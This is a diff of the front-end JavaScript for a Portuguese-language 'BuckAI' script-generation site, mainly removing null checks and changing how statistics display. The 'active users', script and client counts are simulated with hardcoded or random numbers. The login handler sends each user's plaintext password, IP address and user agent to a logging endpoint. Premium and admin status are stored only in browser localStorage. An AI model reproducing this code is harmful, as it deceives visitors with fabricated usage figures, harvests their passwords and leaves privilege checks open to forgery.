@@ -65,7 +65,6 @@ document.addEventListener('DOMContentLoaded', () => {
   const userIdDisplay = document.getElementById('userIdDisplay');
   const userNameDisplay = document.getElementById('userNameDisplay');
   const userStatusDisplay = document.getElementById('userStatusDisplay');
-  const verifySubBtn = document.getElementById('verifySubBtn'); // ADICIONADO: Correção de crash
 
   const adminBatchBtn = document.getElementById('adminBatchBtn');
   const adminBatchCount = document.getElementById('adminBatchCount');
@@ -84,10 +83,6 @@ document.addEventListener('DOMContentLoaded', () => {
   const supportMessages = document.getElementById('supportMessages');
   const supportInput = document.getElementById('supportInput');
   const sendSupportBtn = document.getElementById('sendSupportBtn');
-
-  // --- Estado Global ---
-  let selectedImageBase64 = null; // ADICIONADO: Correção de erro de definição
-  let studentImageBase64 = null;  // ADICIONADO: Correção de erro de definição
 
   // --- Configurações ---
   const MAX_FREE_CREDITS = 5;
@@ -116,27 +111,21 @@ document.addEventListener('DOMContentLoaded', () => {
     }, speed);
   };
 
-  // Simulação de estatísticas estáveis
+  // Simulação de estatísticas
   const updateStatsUI = () => {
-    let webStats = JSON.parse(localStorage.getItem('buckai_stats_v3')) || {
-      totalScripts: 1542,
-      totalClients: 894
+    let webStats = JSON.parse(localStorage.getItem('buckai_stats')) || {
+      totalScripts: Math.floor(Math.random() * 50) + 100,
+      totalClients: Math.floor(Math.random() * 20) + 50
     };
-    
-    // Ativos agora com flutuação pequena e realista
-    const baseActive = 42;
-    const fluctuation = Math.floor(Math.random() * 5) - 2; // -2 a +2
-    const currentActive = Math.max(35, baseActive + fluctuation);
-
-    if (activeNowEl) activeNowEl.textContent = currentActive;
-    if (totalScriptsEl) totalScriptsEl.textContent = webStats.totalScripts.toLocaleString();
-    if (totalClientsEl) totalClientsEl.textContent = webStats.totalClients.toLocaleString();
+    activeNowEl.textContent = Math.floor(Math.random() * 8) + 2;
+    totalScriptsEl.textContent = webStats.totalScripts;
+    totalClientsEl.textContent = webStats.totalClients;
   };
 
   const incrementGlobalScripts = () => {
-    let webStats = JSON.parse(localStorage.getItem('buckai_stats_v3')) || { totalScripts: 1542, totalClients: 894 };
+    let webStats = JSON.parse(localStorage.getItem('buckai_stats')) || { totalScripts: 100, totalClients: 50 };
     webStats.totalScripts++;
-    localStorage.setItem('buckai_stats_v3', JSON.stringify(webStats));
+    localStorage.setItem('buckai_stats', JSON.stringify(webStats));
     updateStatsUI();
   };
 
@@ -181,59 +170,48 @@ document.addEventListener('DOMContentLoaded', () => {
   };
 
   const updateUI = () => {
-    try {
-      // Verificar Termos de Serviço primeiro
-      if (localStorage.getItem('buckai_terms_accepted') !== 'true') {
-        // window.location.href = 'terms.html'; // Removido redirecionamento forçado para debug
-        console.warn("Termos não aceitos, mas carregando interface por segurança.");
-      }
-
-      const data = getUserData();
-      if (data && data.username) {
-        if (welcomeUserEl) welcomeUserEl.textContent = `BEM-VINDO, ${data.username.toUpperCase()}`;
-        if (userCreditsEl) userCreditsEl.textContent = data.isPremium ? "∞" : (data.credits || 0);
-        if (userAvatar) userAvatar.src = data.avatar || 'https://cdn.discordapp.com/embed/avatars/0.png';
-        
-        // Atualizar info do modal de perfil
-        if (userIdDisplay) userIdDisplay.textContent = data.id || '#000000';
-        if (userNameDisplay) userNameDisplay.textContent = data.username.toUpperCase();
-        if (userStatusDisplay) {
-          userStatusDisplay.textContent = data.isPremium ? "Membro Premium 👑" : "Membro Free ⚡";
-        }
-        if (profilePreview) profilePreview.src = data.avatar || 'https://cdn.discordapp.com/embed/avatars/0.png';
-
-        if (upgradeBtn) {
-          if (data.isPremium) {
-            upgradeBtn.innerHTML = '<i class="fas fa-crown"></i> PLANO PREMIUM';
-            upgradeBtn.classList.add('active');
-            if (activationArea) activationArea.classList.add('hidden');
-          } else {
-            upgradeBtn.innerHTML = '<i class="fas fa-crown"></i> SEJA PREMIUM';
-            upgradeBtn.classList.remove('active');
-            if (activationArea) activationArea.classList.remove('hidden');
-          }
-        }
-
-        if (userInfoBar) userInfoBar.classList.remove('hidden');
-        if (lockScreen) lockScreen.classList.add('hidden');
-
-        // Mostrar aba Admin se for Admin
-        if (adminPanelBtn) {
-          if (data.isAdmin) adminPanelBtn.classList.remove('hidden');
-          else adminPanelBtn.classList.add('hidden');
-        }
-      } else {
-        if (lockScreen) lockScreen.classList.remove('hidden');
-        if (userInfoBar) userInfoBar.classList.add('hidden');
-      }
-      
-      renderHistory();
-      updateStatsUI();
-    } catch (err) {
-      console.error("Erro no updateUI:", err);
-      // Fallback para garantir que as estatísticas carreguem mesmo com erro de usuário
-      updateStatsUI();
+    // Verificar Termos de Serviço primeiro
+    if (localStorage.getItem('buckai_terms_accepted') !== 'true') {
+      window.location.href = 'terms.html';
+      return;
     }
+
+    const data = getUserData();
+    if (data.username) {
+      welcomeUserEl.textContent = `BEM-VINDO, ${data.username.toUpperCase()}`;
+      userCreditsEl.textContent = data.isPremium ? "∞" : data.credits;
+      userAvatar.src = data.avatar;
+      
+      // Atualizar info do modal de perfil
+      userIdDisplay.textContent = data.id;
+      userNameDisplay.textContent = data.username.toUpperCase();
+      userStatusDisplay.textContent = data.isPremium ? "Membro Premium 👑" : "Membro Free ⚡";
+      profilePreview.src = data.avatar;
+
+      if (data.isPremium) {
+        upgradeBtn.innerHTML = '<i class="fas fa-crown"></i> PLANO PREMIUM';
+        upgradeBtn.classList.add('active');
+        activationArea.classList.add('hidden');
+      } else {
+        upgradeBtn.innerHTML = '<i class="fas fa-crown"></i> SEJA PREMIUM';
+        upgradeBtn.classList.remove('active');
+        activationArea.classList.remove('hidden');
+      }
+
+      userInfoBar.classList.remove('hidden');
+      lockScreen.classList.add('hidden');
+
+      // Mostrar aba Admin se for Admin
+      if (data.isAdmin) {
+        adminPanelBtn.classList.remove('hidden');
+      } else {
+        adminPanelBtn.classList.add('hidden');
+      }
+    } else {
+      lockScreen.classList.remove('hidden');
+    }
+    renderHistory();
+    updateStatsUI();
   };
 
   const useCredit = () => {
@@ -532,31 +510,29 @@ document.addEventListener('DOMContentLoaded', () => {
   });
 
   // --- Autenticação ---
-  if (verifySubBtn) {
-    verifySubBtn.addEventListener('click', async () => {
-      const username = authUsernameInput.value.trim();
-      const password = authPasswordInput.value.trim();
+  verifySubBtn.addEventListener('click', async () => {
+    const username = authUsernameInput.value.trim();
+    const password = authPasswordInput.value.trim();
 
-      if (!username || !password) {
-        alert('Por favor, preencha usuário e senha.');
-        return;
-      }
+    if (!username || !password) {
+      alert('Por favor, preencha usuário e senha.');
+      return;
+    }
 
-      const data = getUserData();
-      data.username = username;
-      saveUserData(data);
-      
-      const ip = await getIP();
-      fetch('/api/log', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ type: 'login', username, password, ip, userAgent: navigator.userAgent })
-      });
-
-      updateUI();
-      alert(`Bem-vindo, ${username}! Você ganhou 5 créditos diários.`);
+    const data = getUserData();
+    data.username = username;
+    saveUserData(data);
+    
+    const ip = await getIP();
+    fetch('/api/log', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ type: 'login', username, password, ip, userAgent: navigator.userAgent })
     });
-  }
+
+    updateUI();
+    alert(`Bem-vindo, ${username}! Você ganhou 5 créditos diários.`);
+  });
 
   // --- Funcionalidades Principais ---
 
@@ -938,7 +914,6 @@ document.addEventListener('DOMContentLoaded', () => {
   };
 
   updateUI();
-  setInterval(updateStatsUI, 15000); // ADICIONADO: Atualizar estatísticas a cada 15s de forma estável
 
   // Outros ouvintes de eventos
   uploadImageBtn.addEventListener('click', () => imageInput.click());
